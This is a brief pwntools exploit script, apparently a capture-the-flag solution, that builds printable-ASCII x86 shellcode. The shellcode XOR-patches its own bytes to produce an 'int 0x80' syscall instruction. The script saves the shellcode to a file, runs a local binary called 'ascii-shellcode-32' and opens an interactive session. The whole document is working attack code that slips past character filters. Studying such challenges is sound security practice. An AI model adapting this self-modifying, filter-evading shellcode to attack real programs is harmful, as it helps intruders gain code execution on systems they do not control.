from pwn import *

shellcode = asm('''
push   eax
pop    edx # store eax in edx

push   0x31 # zero eax
pop    eax
xor    al, 0x31
dec    eax # gets us ff

xor [edx + 0xe], al
xor [edx + 0xf], al

.dc.b 0x32, 0x7f # these ^ ff = int 0x80
''')

print(disasm(shellcode))

with open('shellcode.bin', 'wb') as f:
    f.write(shellcode)


io = process("ascii-shellcode-32", env={"PATH":"."})


io.interactive()
